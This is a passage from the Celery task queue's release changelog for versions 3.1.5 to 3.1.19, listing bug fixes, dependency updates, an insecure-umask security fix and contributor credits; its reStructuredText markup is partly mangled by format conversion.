celery/kombu#375).  - **Worker**: Task request now properly sets``priority`in delivery_info.      Fix contributed by Gerald Manipon.  - **Beat**: PyPy shelve may raise`KeyError``when setting keys   (Issue #2862).  - **Programs**: :program:`celery beat --deatched` now working on PyPy.      Fix contributed by Krzysztof Bujniewicz.  - **Results**: Redis result backend now ensures all pipelines are cleaned up.      Contributed by Justin Patrin.  - **Results**: Redis result backend now allows for timeout to be set in the   query portion of the result backend URL.      For example``CELERY\_RESULT\_BACKEND = '<redis://?timeout=10>'`Contributed by Justin Patrin.  - **Results**:`result.get``now properly handles failures where the   exception value is set to `None` (Issue #2560).  - **Prefork pool**: Fixed attribute error``proc.dead``.  - **Worker**: Fixed worker hanging when gossip/heartbeat disabled   (Issue #1847).      Fix contributed by Aaron Webber and Bryan Helmig.  - **Results**: MongoDB result backend now supports pymongo 3.x   (Issue #2744).      Fix contributed by Sukrit Khera.  - **Results**: RPC/AMQP backends didn't deserialize exceptions properly   (Issue #2691).      Fix contributed by Sukrit Khera.  - **Programs**: Fixed problem with :program:`celery amqp`'s``basic\_publish``(Issue #2013).  - **Worker**: Embedded beat now properly sets app for thread/process   (Issue #2594).  - **Documentation**: Many improvements and typos fixed.      Contributions by:          Carlos Garcia-Dubus         D. Yu         :github_user:`jerry`         Jocelyn Delalande         Josh Kupershmidt         Juan Rossi         :github_user:`kanemra`         Paul Pearce         Pavel Savchenko         Sean Wang         Seungha Kim         Zhaorong Ma  .. _version-3.1.18:  3.1.18 ====== :release-date: 2015-04-22 05:30 p.m. UTC :release-by: Ask Solem  - **Requirements**      - Now depends on [Kombu 3.0.25 <kombu:version-3.0.25>](#kombu-3.0.25-<kombu:version-3.0.25>).      - Now depends on :mod:`billiard` 3.3.0.20.  - **Django**: Now supports Django 1.8 (Issue #2536).      Fix contributed by Bence Tamas and Mickaël Penhard.  - **Results**: MongoDB result backend now compatible with pymongo 3.0.      Fix contributed by Fatih Sucu.  - **Tasks**: Fixed bug only happening when a task has multiple callbacks   (Issue #2515).      Fix contributed by NotSqrt.  - **Commands**: Preload options now support``--arg value`syntax.      Fix contributed by John Anderson.  - **Compat**: A typo caused`celery.log.setup\_logging\_subsystem``to be   undefined.      Fix contributed by Gunnlaugur Thor Briem.  - **init-scripts**: The beat generic init-script now uses   :file:`/bin/sh` instead of :command:`bash` (Issue #2496).      Fix contributed by Jelle Verstraaten.  - **Django**: Fixed a `TypeError` sometimes occurring in logging   when validating models.      Fix contributed by Alexander.  - **Commands**: Worker now supports new   :option:`--executable <celery worker --executable>` argument that can   be used with :option:`celery worker --detach`.      Contributed by Bert Vanderbauwhede.  - **Canvas**: Fixed crash in chord unlock fallback task (Issue #2404).  - **Worker**: Fixed rare crash occurring with   :option:`--autoscale <celery worker --autoscale>` enabled (Issue #2411).  - **Django**: Properly recycle worker Django database connections when the   Django``CONN\_MAX\_AGE``setting is enabled (Issue #2453).      Fix contributed by Luke Burden.  .. _version-3.1.17:  3.1.17 ====== :release-date: 2014-11-19 03:30 p.m. UTC :release-by: Ask Solem  .. admonition:: Don't enable the `CELERYD_FORCE_EXECV` setting!      Please review your configuration and disable this option if you're using the     RabbitMQ or Redis transport.      Keeping this option enabled after 3.1 means the async based prefork pool will     be disabled, which can easily cause instability.  - **Requirements**      - Now depends on [Kombu 3.0.24 <kombu:version-3.0.24>](#kombu-3.0.24-<kombu:version-3.0.24>).          Includes the new Qpid transport coming in Celery 3.2, backported to         support those who may still require Python 2.6 compatibility.      - Now depends on :mod:`billiard` 3.3.0.19.      -``celery\[librabbitmq\]`now depends on librabbitmq 1.6.1.  - **Task**: The timing of ETA/countdown tasks were off after the example`LocalTimezone``implementation in the Python documentation no longer works in Python 3.4.   (Issue #2306).  - **Task**: Raising `~celery.exceptions.Ignore` no longer sends``task-failed`event (Issue #2365).  - **Redis result backend**: Fixed unbound local errors.      Fix contributed by Thomas French.  - **Task**: Callbacks wasn't called properly if`link`was a list of   signatures (Issue #2350).  - **Canvas**: chain and group now handles json serialized signatures   (Issue #2076).  - **Results**:`.join\_native()`would accidentally treat the`STARTED``state as being ready (Issue #2326).      This could lead to the chord callback being called with invalid arguments     when using chords with the :setting:`CELERY_TRACK_STARTED` setting     enabled.  - **Canvas**: The``chord\_size`attribute is now set for all canvas primitives,   making sure more combinations will work with the`new\_join`optimization   for Redis (Issue #2339).  - **Task**: Fixed problem with app not being properly propagated to`trace\_task``in all cases.      Fix contributed by :github_user:`kristaps`.  - **Worker**: Expires from task message now associated with a timezone.      Fix contributed by Albert Wang.  - **Cassandra result backend**: Fixed problems when using detailed mode.      When using the Cassandra backend in detailed mode, a regression     caused errors when attempting to retrieve results.      Fix contributed by Gino Ledesma.  - **Mongodb Result backend**: Pickling the backend instance will now include   the original URL (Issue #2347).      Fix contributed by Sukrit Khera.  - **Task**: Exception info wasn't properly set for tasks raising   `~celery.exceptions.Reject` (Issue #2043).  - **Worker**: Duplicates are now removed when loading the set of revoked tasks   from the worker state database (Issue #2336).  - **celery.contrib.rdb**: Fixed problems with``rdb.set\_trace``calling stop   from the wrong frame.      Fix contributed by :github_user:`llllllllll`.  - **Canvas**:``chain`and`chord`can now be immutable.  - **Canvas**:`chord.apply\_async`will now keep partial args set in`self.args`(Issue #2299).  - **Results**: Small refactoring so that results are decoded the same way in   all result backends.  - **Logging**: The`processName``format was introduced in Python 2.6.2 so for   compatibility this format is now excluded when using earlier versions   (Issue #1644).  .. _version-3.1.16:  3.1.16 ====== :release-date: 2014-10-03 06:00 p.m. UTC :release-by: Ask Solem  - **Worker**: 3.1.15 broke :option:`-Ofair <celery worker -O>`   behavior (Issue #2286).      This regression could result in all tasks executing     in a single child process if``-Ofair`was enabled.  - **Canvas**:`celery.signature`now properly forwards app argument   in all cases.  - **Task**:`.retry()`didn't raise the exception correctly   when called without a current exception.      Fix contributed by Andrea Rabbaglietti.  - **Worker**: The`enable\_events`remote control command   disabled worker-related events by mistake (Issue #2272).      Fix contributed by Konstantinos Koukopoulos.  - **Django**: Adds support for Django 1.7 class names in INSTALLED_APPS   when using`app.autodiscover\_tasks()`(Issue #2248).  - **Sphinx**:`celery.contrib.sphinx`now uses`getfullargspec`on Python 3 (Issue #2302).  - **Redis/Cache Backends**: Chords will now run at most once if one or more tasks   in the chord are executed multiple times for some reason.  .. _version-3.1.15:  3.1.15 ====== :release-date: 2014-09-14 11:00 p.m. UTC :release-by: Ask Solem  - **Django**: Now makes sure`django.setup()`is called   before importing any task modules (Django 1.7 compatibility, Issue #2227)  - **Results**:`result.get()`was misbehaving by calling`backend.get\_task\_meta``in a :keyword:`finally` call leading to   AMQP result backend queues not being properly cleaned up (Issue #2245).  .. _version-3.1.14:  3.1.14 ====== :release-date: 2014-09-08 03:00 p.m. UTC :release-by: Ask Solem  - **Requirements**      - Now depends on [Kombu 3.0.22 <kombu:version-3.0.22>](#kombu-3.0.22-<kombu:version-3.0.22>).  - **Init-scripts**: The generic worker init-scripts``status`command   now gets an accurate pidfile list (Issue #1942).  - **Init-scripts**: The generic beat script now implements the`status`command.      Contributed by John Whitlock.  - **Commands**: Multi now writes informational output to stdout instead of stderr.  - **Worker**: Now ignores not implemented error for`pool.restart`(Issue #2153).  - **Task**: Retry no longer raises retry exception when executed in eager   mode (Issue #2164).  - **AMQP Result backend**: Now ensured`on\_interval``is called at least   every second for blocking calls to properly propagate parent errors.  - **Django**: Compatibility with Django 1.7 on Windows (Issue #2126).  - **Programs**: :option:`!--umask` argument can now be   specified in both octal (if starting with 0) or decimal.   .. _version-3.1.13:  3.1.13 ======  Security Fixes --------------  * [Security: `CELERYSA-0002`_] Insecure default umask.      The built-in utility used to daemonize the Celery worker service sets     an insecure umask by default (umask 0).      This means that any files or directories created by the worker will     end up having world-writable permissions.      Special thanks to Red Hat for originally discovering and reporting the     issue!      This version will no longer set a default umask by default, so if unset     the umask of the parent process will be used.     News ----  - **Requirements**      - Now depends on [Kombu 3.0.21 <kombu:version-3.0.21>](#kombu-3.0.21-<kombu:version-3.0.21>).      - Now depends on :mod:`billiard` 3.3.0.18.   - **App**:``backend``argument now also sets the :setting:`CELERY_RESULT_BACKEND`   setting.  - **Task**:``signature\_from\_request`now propagates`reply\_to`so that   the RPC backend works with retried tasks (Issue #2113).  - **Task**:`retry``will no longer attempt to re-queue the task if sending   the retry message fails.      Unrelated exceptions being raised could cause a message loop, so it was     better to remove this behavior.  - **Beat**: Accounts for standard 1ms drift by always waking up 0.010s   earlier.      This will adjust the latency so that the periodic tasks won't move     1ms after every invocation.  - Documentation fixes      Contributed by Yuval Greenfield, Lucas Wiman, :github_user:`nicholsonjf`.  - **Worker**: Removed an outdated assert statement that could lead to errors   being masked (Issue #2086).    .. _version-3.1.12:  3.1.12 ====== :release-date: 2014-06-09 10:12 p.m. UTC :release-by: Ask Solem  - **Requirements**      Now depends on [Kombu 3.0.19 <kombu:version-3.0.19>](#kombu-3.0.19-<kombu:version-3.0.19>).  - **App**: Connections weren't being closed after fork due to an error in the   after fork handler (Issue #2055).      This could manifest itself by causing framing errors when using RabbitMQ.     (``Unexpected frame`).  - **Django**:`django.setup()`was being called too late when   using Django 1.7 (Issue #1802).  - **Django**: Fixed problems with event timezones when using Django   (`Substantial drift`).      Celery didn't take into account that Django modifies the`time.timeone`attributes and friends.  - **Canvas**:`Signature.link``now works when the link option is a scalar   value (Issue #2019).  - **Prefork pool**: Fixed race conditions for when file descriptors are   removed from the event loop.      Fix contributed by Roger Hu.  - **Prefork pool**: Improved solution for dividing tasks between child   processes.      This change should improve performance when there are many child     processes, and also decrease the chance that two subsequent tasks are     written to the same child process.  - **Worker**: Now ignores unknown event types, instead of crashing.      Fix contributed by Illes Solt.  - **Programs**: :program:`celery worker --detach` no longer closes open file   descriptors when :envvar:`C_FAKEFORK` is used so that the workers output   can be seen.  - **Programs**: The default working directory for :program:`celery worker   --detach` is now the current working directory, not``/`.  - **Canvas**:`signature(s, app=app)`didn't upgrade serialized signatures   to their original class (`subtask\_type`) when the`app`keyword argument   was used.  - **Control**: The`duplicate nodename`warning emitted by control commands   now shows the duplicate node name.  - **Tasks**: Can now call`ResultSet.get()`on a result set without members.      Fix contributed by Alexey Kotlyarov.  - **App**: Fixed strange traceback mangling issue for`app.connection\_or\_acquire``.  - **Programs**: The :program:`celery multi stopwait` command is now documented   in usage.  - **Other**: Fixed cleanup problem with``PromiseProxy`when an error is   raised while trying to evaluate the promise.  - **Other**: The utility used to censor configuration values now handles   non-string keys.      Fix contributed by Luke Pomfrey.  - **Other**: The`inspect conf``command didn't handle non-string keys well.      Fix contributed by Jay Farrimond.  - **Programs**: Fixed argument handling problem in   :program:`celery worker --detach`.      Fix contributed by Dmitry Malinovsky.  - **Programs**: :program:`celery worker --detach` didn't forward working   directory option (Issue #2003).  - **Programs**: :program:`celery inspect registered` no longer includes   the list of built-in tasks.  - **Worker**: The``requires`attribute for boot steps weren't being handled   correctly (Issue #2002).  - **Eventlet**: The eventlet pool now supports the`pool\_grow`and`pool\_shrink`remote control commands.      Contributed by Mher Movsisyan.  - **Eventlet**: The eventlet pool now implements statistics for   :program:`celery inspect stats`.      Contributed by Mher Movsisyan.  - **Documentation**: Clarified`Task.rate\_limit`behavior.      Contributed by Jonas Haag.  - **Documentation**:`AbortableTask``examples now updated to use the new   API (Issue #1993).  - **Documentation**: The security documentation examples used an out of date   import.      Fix contributed by Ian Dees.  - **Init-scripts**: The CentOS init-scripts didn't quote   :envvar:`CELERY_CHDIR`.      Fix contributed by :github_user:`ffeast`.  .. _version-3.1.11:  3.1.11 ====== :release-date: 2014-04-16 11:00 p.m. UTC :release-by: Ask Solem  - **Now compatible with RabbitMQ 3.3.0**      You need to run Celery 3.1.11 or later when using RabbitMQ 3.3,     and if you use the``librabbitmq`module you also have to upgrade     to librabbitmq 1.5.0:`\`bash $ pip install -U librabbitmq

</div>

  - **Requirements**:
    
    >   - Now depends on \[Kombu 3.0.15 \<kombu:version-3.0.15\>\](\#kombu-3.0.15-\<kombu:version-3.0.15\>).
    >   - Now depends on [billiard 3.3.0.17](https://github.com/celery/billiard/blob/master/CHANGES.txt).
    >   - Bundle `celery[librabbitmq]` now depends on `librabbitmq` 1.5.0.

  - **Tasks**: The `CELERY_DEFAULT_DELIVERY_MODE` setting was being ignored (Issue \#1953).

  - **Worker**: New `celery worker --heartbeat-interval` can be used to change the time (in seconds) between sending event heartbeats.
    
    > Contributed by Matthew Duggan and Craig Northway.

  - **App**: Fixed memory leaks occurring when creating lots of temporary app instances (Issue \#1949).

  - **MongoDB**: SSL configuration with non-MongoDB transport breaks MongoDB results backend (Issue \#1973).
    
    > Fix contributed by Brian Bouterse.

  - **Logging**: The color formatter accidentally modified `record.msg` (Issue \#1939).

  - **Results**: Fixed problem with task trails being stored multiple times, causing `result.collect()` to hang (Issue \#1936, Issue \#1943).

  - **Results**: `ResultSet` now implements a `.backend` attribute for compatibility with `AsyncResult`.

  - **Results**: `.forget()` now also clears the local cache.

  - **Results**: Fixed problem with multiple calls to `result._set_cache` (Issue \#1940).

  - **Results**: `join_native` populated result cache even if disabled.

  - **Results**: The YAML result serializer should now be able to handle storing exceptions.

  - **Worker**: No longer sends task error emails for expected errors (in `@task(throws=(..., )))`.

  - **Canvas**: Fixed problem with exception deserialization when using the JSON serializer (Issue \#1987).

  - **Eventlet**: Fixes crash when `celery.contrib.batches` attempted to cancel a non-existing timer (Issue \#1984).

  - Can now import `celery.version_info_t`, and `celery.five` (Issue \#1968).

<div id="version-3.1.10">

3.1.10 `` ` ====== :release-date: 2014-03-22 09:40 p.m. UTC :release-by: Ask Solem  - **Requirements**:      - Now depends on [Kombu 3.0.14 <kombu:version-3.0.14>](#kombu-3.0.14-<kombu:version-3.0.14>).  - **Results**:      Reliability improvements to the SQLAlchemy database backend. Previously the     connection from the MainProcess was improperly shared with the workers.     (Issue #1786)  - **Redis:** Important note about events (Issue #1882).      There's a new transport option for Redis that enables monitors     to filter out unwanted events. Enabling this option in the workers     will increase performance considerably: ``\`python BROKER\_TRANSPORT\_OPTIONS = {'fanout\_patterns': True}

</div>

> Enabling this option means that your workers won't be able to see workers with the option disabled (or is running an older version of Celery), so if you do enable it then make sure you do so on all nodes.
> 
> See \[redis-caveats\](\#redis-caveats).
> 
> This will be the default in Celery 3.2.

  - **Results**: The <span class="title-ref">@AsyncResult</span> object now keeps a local cache of the final state of the task.
    
    > This means that the global result cache can finally be disabled, and you can do so by setting `CELERY_MAX_CACHED_RESULTS` to <span class="title-ref">-1</span>. The lifetime of the cache will then be bound to the lifetime of the result object, which will be the default behavior in Celery 3.2.

  - **Events**: The "Substantial drift" warning message is now logged once per node name only (Issue \#1802).

  - **Worker**: Ability to use one log file per child process when using the prefork pool.
    
    > This can be enabled by using the new `%i` and `%I` format specifiers for the log file name. See \[worker-files-process-index\](\#worker-files-process-index).

  - **Redis**: New experimental chord join implementation.
    
    > This is an optimization for chords when using the Redis result backend, where the join operation is now considerably faster and using less resources than the previous strategy.
    > 
    > The new option can be set in the result backend URL:
    > 
    > ``` python
    > CELERY_RESULT_BACKEND = 'redis://localhost?new_join=1'
    > ```
    > 
    > This must be enabled manually as it's incompatible with workers and clients not using it, so be sure to enable the option in all clients and workers if you decide to use it.

  - **Multi**: With `-opt:index` (e.g., `-c:1`) the index now always refers to the position of a node in the argument list.
    
    > This means that referring to a number will work when specifying a list of node names and not just for a number range:
    > 
    > ``` bash
    > celery multi start A B C D -c:1 4 -c:2-4 8
    > ```
    > 
    > In this example `1` refers to node A (as it's the first node in the list).

  - **Signals**: The sender argument to `Signal.connect` can now be a proxy object, which means that it can be used with the task decorator (Issue \#1873).

  - **Task**: A regression caused the `queue` argument to `Task.retry` to be ignored (Issue \#1892).

  - **App**: Fixed error message for <span class="title-ref">\~@Celery.config\_from\_envvar</span>.
    
    > Fix contributed by Dmitry Malinovsky.

  - **Canvas**: Chords can now contain a group of other chords (Issue \#1921).

  - **Canvas**: Chords can now be combined when using the amqp result backend (a chord where the callback is also a chord).

  - **Canvas**: Calling `result.get()` for a chain task will now complete even if one of the tasks in the chain is `ignore_result=True` (Issue \#1905).

  - **Canvas**: Worker now also logs chord errors.

  - **Canvas**: A chord task raising an exception will now result in any errbacks (`link_error`) to the chord callback to also be called.

  - **Results**: Reliability improvements to the SQLAlchemy database backend (Issue \#1786).
    
    > Previously the connection from the `MainProcess` was improperly inherited by child processes.
    > 
    > Fix contributed by Ionel Cristian Mărieș.

  - **Task**: Task callbacks and errbacks are now called using the group primitive.

  - **Task**: `Task.apply` now properly sets `request.headers` (Issue \#1874).

  - **Worker**: Fixed <span class="title-ref">UnicodeEncodeError</span> occurring when worker is started by `supervisor`.
    
    > Fix contributed by Codeb Fan.

  - **Beat**: No longer attempts to upgrade a newly created database file (Issue \#1923).

  - **Beat**: New setting `` `CELERYBEAT_SYNC_EVERY ``\` can be be used to control file sync by specifying the number of tasks to send between each sync.
    
    > Contributed by Chris Clark.

  - **Commands**: `celery inspect memdump` no longer crashes if the `psutil` module isn't installed (Issue \#1914).

  - **Worker**: Remote control commands now always accepts json serialized messages (Issue \#1870).

  - **Worker**: Gossip will now drop any task related events it receives by mistake (Issue \#1882).

<div id="version-3.1.9">

3.1.9 `` ` ===== :release-date: 2014-02-10 06:43 p.m. UTC :release-by: Ask Solem  - **Requirements**:      - Now depends on [Kombu 3.0.12 <kombu:version-3.0.12>](#kombu-3.0.12-<kombu:version-3.0.12>).  - **Prefork pool**: Better handling of exiting child processes.      Fix contributed by Ionel Cristian Mărieș.  - **Prefork pool**: Now makes sure all file descriptors are removed   from the hub when a process is cleaned up.      Fix contributed by Ionel Cristian Mărieș.  - **New Sphinx extension**: for autodoc documentation of tasks:   :mod:`celery.contrib.spinx` (Issue #1833).  - **Django**: Now works with Django 1.7a1.  - **Task**: Task.backend is now a property that forwards to ``app.backend``if no custom backend has been specified for the task (Issue #1821).  - **Generic init-scripts**: Fixed bug in stop command.      Fix contributed by Rinat Shigapov.  - **Generic init-scripts**: Fixed compatibility with GNU :manpage:`stat`.      Fix contributed by Paul Kilgo.  - **Generic init-scripts**: Fixed compatibility with the minimal   :program:`dash` shell (Issue #1815).  - **Commands**: The :program:`celery amqp basic.publish` command wasn't   working properly.      Fix contributed by Andrey Voronov.  - **Commands**: Did no longer emit an error message if the pidfile exists   and the process is still alive (Issue #1855).  - **Commands**: Better error message for missing arguments to preload   options (Issue #1860).  - **Commands**: :program:`celery -h` didn't work because of a bug in the   argument parser (Issue #1849).  - **Worker**: Improved error message for message decoding errors.  - **Time**: Now properly parses the `Z` timezone specifier in ISO 8601 date   strings.      Fix contributed by Martin Davidsson.  - **Worker**: Now uses the *negotiated* heartbeat value to calculate   how often to run the heartbeat checks.  - **Beat**: Fixed problem with beat hanging after the first schedule   iteration (Issue #1822).      Fix contributed by Roger Hu.  - **Signals**: The header argument to :signal:`before_task_publish` is now   always a dictionary instance so that signal handlers can add headers.  - **Worker**: A list of message headers is now included in message related   errors.  .. _version-3.1.8:  3.1.8 ===== :release-date: 2014-01-17 10:45 p.m. UTC :release-by: Ask Solem  - **Requirements**:      - Now depends on [Kombu 3.0.10 <kombu:version-3.0.10>](#kombu-3.0.10-<kombu:version-3.0.10>).      - Now depends on `billiard 3.3.0.14`_.     - **Worker**: The event loop wasn't properly reinitialized at consumer restart   which would force the worker to continue with a closed``epoll`instance on   Linux, resulting in a crash.  - **Events:** Fixed issue with both heartbeats and task events that could   result in the data not being kept in sorted order.      As a result this would force the worker to log "heartbeat missed"     events even though the remote node was sending heartbeats in a timely manner.  - **Results:** The pickle serializer no longer converts group results to tuples,   and will keep the original type (*Issue #1750*).  - **Results:**`ResultSet.iterate`is now pending deprecation.      The method will be deprecated in version 3.2 and removed in version 3.3.      Use`result.get(callback=)`(or`result.iter\_native()``where available)     instead.  - **Worker**\|eventlet/gevent: A regression caused :kbd:`Control-c` to be   ineffective for shutdown.  - **Redis result backend:** Now using a pipeline to store state changes   for improved performance.      Contributed by Pepijn de Vos.  - **Redis result backend:** Will now retry storing the result if disconnected.  - **Worker**\|gossip: Fixed attribute error occurring when another node leaves.      Fix contributed by Brodie Rao.  - **Generic init-scripts:** Now runs a check at start-up to verify   that any configuration scripts are owned by root and that they   aren't world/group writable.      The init-script configuration is a shell script executed by root,     so this is a preventive measure to ensure that users don't     leave this file vulnerable to changes by unprivileged users.      > **Note** >          Note that upgrading Celery won't update the init-scripts,         instead you need to manually copy the improved versions from the         source distribution:         https://github.com/celery/celery/tree/3.1/extra/generic-init.d  - **Commands**: The :program:`celery purge` command now warns that the operation   will delete all tasks and prompts the user for confirmation.      A new :option:`-f <celery purge -f>` was added that can be used to disable     interactive mode.  - **Task**:``.retry()`didn't raise the value provided in the`exc``argument   when called outside of an error context (*Issue #1755*).  - **Commands:** The :program:`celery multi` command didn't forward command   line configuration to the target workers.      The change means that multi will forward the special``--``argument and     configuration content at the end of the arguments line to the specified     workers.      Example using command-line configuration to set a broker heartbeat     from :program:`celery multi`:``\`bash $ celery multi start 1 -c3 -- broker.heartbeat=30

</div>

> Fix contributed by Antoine Legrand.

  - **Canvas:** `chain.apply_async()` now properly forwards execution options.
    
    > Fix contributed by Konstantin Podshumok.

  - **Redis result backend:** Now takes `connection_pool` argument that can be used to change the connection pool class/constructor.

  - **Worker:** Now truncates very long arguments and keyword arguments logged by the pool at debug severity.

  - **Worker:** The worker now closes all open files on `SIGHUP` (regression) (*Issue \#1768*).
    
    > Fix contributed by Brodie Rao

  - **Worker:** Will no longer accept remote control commands while the worker start-up phase is incomplete (*Issue \#1741*).

  - **Commands:** The output of the event dump utility (`celery events -d`) can now be piped into other commands.

  - **Documentation:** The RabbitMQ installation instructions for macOS was updated to use modern Homebrew practices.
    
    > Contributed by Jon Chen.

  - **Commands:** The `celery inspect conf` utility now works.

  - **Commands:** The `--no-color <celery --no-color>` argument was not respected by all commands (*Issue \#1799*).

  - **App:** Fixed rare bug with `autodiscover_tasks()` (*Issue \#1797*).

  - **Distribution:** The sphinx docs will now always add the parent directory to path so that the current Celery source code is used as a basis for API documentation (*Issue \#1782*).

  - **Documentation:** `supervisor` examples contained an extraneous '-' in a `--logfile <celery worker --logfile>` argument example.
    
    > Fix contributed by Mohammad Almeer.

<div id="version-3.1.7">

3.1.7 `` ` ===== :release-date: 2013-12-17 06:00 p.m. UTC :release-by: Ask Solem  .. _v317-important:  Important Notes ---------------  Init-script security improvements ---------------------------------  Where the generic init-scripts (for ``celeryd`, and`celerybeat`) before delegated the responsibility of dropping privileges to the target application, it will now use`su`instead, so that the Python program isn't trusted with superuser privileges.  This isn't in reaction to any known exploit, but it will limit the possibility of a privilege escalation bug being abused in the future.  You have to upgrade the init-scripts manually from this directory: https://github.com/celery/celery/tree/3.1/extra/generic-init.d  AMQP result backend ~~~~~~~~~~~~~~~~~~~  The 3.1 release accidentally left the amqp backend configured to be non-persistent by default.  Upgrading from 3.0 would give a "not equivalent" error when attempting to set or retrieve results for a task. That's unless you manually set the persistence setting::      CELERY_RESULT_PERSISTENT = True  This version restores the previous value so if you already forced the upgrade by removing the existing exchange you must either keep the configuration by setting`CELERY\_RESULT\_PERSISTENT = False`or delete the`celeryresults``exchange again.  Synchronous subtasks ~~~~~~~~~~~~~~~~~~~~  Tasks waiting for the result of a subtask will now emit a `RuntimeWarning` warning when using the prefork pool, and in 3.2 this will result in an exception being raised.  It's not legal for tasks to block by waiting for subtasks as this is likely to lead to resource starvation and eventually deadlock when using the prefork pool (see also [task-synchronous-subtasks](#task-synchronous-subtasks)).  If you really know what you're doing you can avoid the warning (and the future exception being raised) by moving the operation in a white-list block:``\`python from celery.result import allow\_join\_result

</div>

> @app.task def misbehaving(): result = other\_task.delay() with allow\_join\_result(): result.get()

Note also that if you wait for the result of a subtask in any form `` ` when using the prefork pool you must also disable the pool prefetching behavior with the worker [-Ofair option <optimizing-prefetch-limit>](#-ofair-option-<optimizing-prefetch-limit>).  .. _v317-fixes:  Fixes -----  - Now depends on [Kombu 3.0.8 <kombu:version-3.0.8>](#kombu-3.0.8-<kombu:version-3.0.8>).  - Now depends on :mod:`billiard` 3.3.0.13  - Events: Fixed compatibility with non-standard json libraries   that sends float as `decimal.Decimal` (Issue #1731)  - Events: State worker objects now always defines attributes: ``active`,`processed`,`loadavg`,`sw\_ident`,`sw\_ver`and`sw\_sys`.  - Worker: Now keeps count of the total number of tasks processed,   not just by type (`all\_active\_count`).  - Init-scripts:  Fixed problem with reading configuration file   when the init-script is symlinked to a runlevel (e.g.,`S02celeryd`).   (Issue #1740).      This also removed a rarely used feature where you can symlink the script     to provide alternative configurations. You instead copy the script     and give it a new name, but perhaps a better solution is to provide     arguments to`CELERYD\_OPTS`to separate them:`\`bash CELERYD\_NODES="X1 X2 Y1 Y2" CELERYD\_OPTS="-A:X1 x -A:X2 x -A:Y1 y -A:Y2 y"

  - Fallback chord unlock task is now always called after the chord header (Issue \#1700).
    
    > This means that the unlock task won't be started if there's an error sending the header.

  - Celery command: Fixed problem with arguments for some control commands.
    
    > Fix contributed by Konstantin Podshumok.

  - Fixed bug in `utcoffset` where the offset when in DST would be completely wrong (Issue \#1743).

  - Worker: Errors occurring while attempting to serialize the result of a task will now cause the task to be marked with failure and a <span class="title-ref">kombu.exceptions.EncodingError</span> error.
    
    > Fix contributed by Ionel Cristian Mărieș.

  - Worker with `-B <celery worker -B>` argument didn't properly shut down the beat instance.

  - Worker: The `%n` and `%h` formats are now also supported by the `--logfile <celery worker --logfile>`, `--pidfile <celery worker --pidfile>` and `--statedb <celery worker --statedb>` arguments.
    
    > Example:
    > 
    > ``` bash
    > $ celery -A proj worker -n foo@%h --logfile=%n.log --statedb=%n.db
    > ```

  - Redis/Cache result backends: Will now timeout if keys evicted while trying to join a chord.

  - The fallback unlock chord task now raises <span class="title-ref">Retry</span> so that the retry even is properly logged by the worker.

  - Multi: Will no longer apply Eventlet/gevent monkey patches (Issue \#1717).

  - Redis result backend: Now supports UNIX sockets.
    
    > Like the Redis broker transport the result backend now also supports using `redis+socket:///tmp/redis.sock` URLs.
    > 
    > Contributed by Alcides Viamontes Esquivel.

  - Events: Events sent by clients was mistaken for worker related events (Issue \#1714).
    
    > For `events.State` the tasks now have a `Task.client` attribute that's set when a `task-sent` event is being received.
    > 
    > Also, a clients logical clock isn't in sync with the cluster so they live in a "time bubble." So for this reason monitors will no longer attempt to merge with the clock of an event sent by a client, instead it will fake the value by using the current clock with a skew of -1.

  - Prefork pool: The method used to find terminated processes was flawed in that it didn't also take into account missing `popen` objects.

  - Canvas: `group` and `chord` now works with anon signatures as long as the group/chord object is associated with an app instance (Issue \#1744).
    
    > You can pass the app by using `group(..., app=app)`.

<div id="version-3.1.6">

3.1.6 `` ` ===== :release-date: 2013-12-02 06:00 p.m. UTC :release-by: Ask Solem  - Now depends on :mod:`billiard` 3.3.0.10.  - Now depends on [Kombu 3.0.7 <kombu:version-3.0.7>](#kombu-3.0.7-<kombu:version-3.0.7>).  - Fixed problem where Mingle caused the worker to hang at start-up   (Issue #1686).  - Beat: Would attempt to drop privileges twice (Issue #1708).  - Windows: Fixed error with ``geteuid`not being available (Issue #1676).  - Tasks can now provide a list of expected error classes (Issue #1682).      The list should only include errors that the task is expected to raise     during normal operation::          @task(throws=(KeyError, HttpNotFound))      What happens when an exceptions is raised depends on the type of error:      - Expected errors (included in`Task.throws`)          Will be logged using severity`INFO`, and traceback is excluded.      - Unexpected errors          Will be logged using severity`ERROR`, with traceback included.  - Cache result backend now compatible with Python 3 (Issue #1697).  - CentOS init-script: Now compatible with SysV style init symlinks.      Fix contributed by Jonathan Jordan.  - Events: Fixed problem when task name isn't defined (Issue #1710).      Fix contributed by Mher Movsisyan.  - Task: Fixed unbound local errors (Issue #1684).      Fix contributed by Markus Ullmann.  - Canvas: Now unrolls groups with only one task (optimization) (Issue #1656).  - Task: Fixed problem with ETA and timezones.      Fix contributed by Alexander Koval.  - Django: Worker now performs model validation (Issue #1681).  - Task decorator now emits less confusing errors when used with   incorrect arguments (Issue #1692).  - Task: New method`Task.send\_event`can be used to send custom events   to Flower and other monitors.  - Fixed a compatibility issue with non-abstract task classes  - Events from clients now uses new node name format (`gen\<pid\>@\<hostname\>``).  - Fixed rare bug with Callable not being defined at interpreter shutdown   (Issue #1678).      Fix contributed by Nick Johnson.  - Fixed Python 2.6 compatibility (Issue #1679).  .. _version-3.1.5:  3.1.5 ===== :release-date: 2013-11-21 06:20 p.m. UTC :release-by: Ask Solem  - Now depends on [Kombu 3.0.6 <kombu:version-3.0.6>](#kombu-3.0.6-<kombu:version-3.0.6>).  - Now depends on :mod:`billiard` 3.3.0.8  - App:``config\_from\_object`is now lazy (Issue #1665).  - App:`autodiscover\_tasks``is now lazy.      Django users should now wrap access to the settings object     in a lambda::          app.autodiscover_tasks(lambda: settings.INSTALLED_APPS)      this ensures that the settings object isn't prepared     prematurely.  - Fixed regression for :option:`--app <celery --app>` argument   experienced by some users (Issue #1653).  - Worker: Now respects the :option:`--uid <celery worker --uid>` and   :option:`--gid <celery worker --gid>` arguments even if   :option:`--detach <celery worker --detach>` isn't enabled.  - Beat: Now respects the :option:`--uid <celery beat --uid>` and   :option:`--gid <celery beat --gid>` arguments even if   :option:`--detach <celery beat --detach>` isn't enabled.  - Python 3: Fixed unorderable error occurring with the worker   :option:`-B <celery worker -B>` argument enabled.  -``celery.VERSION`is now a named tuple.  -`maybe\_signature(list)`is now applied recursively (Issue #1645).  -`celery shell`command: Fixed`IPython.frontend`deprecation warning.  - The default app no longer includes the built-in fix-ups.      This fixes a bug where`celery multi`would attempt     to load the Django settings module before entering     the target working directory.  - The Django daemonization tutorial was changed.      Users no longer have to explicitly export`DJANGO\_SETTINGS\_MODULE``in :file:`/etc/default/celeryd` when the new project layout is used.  - Redis 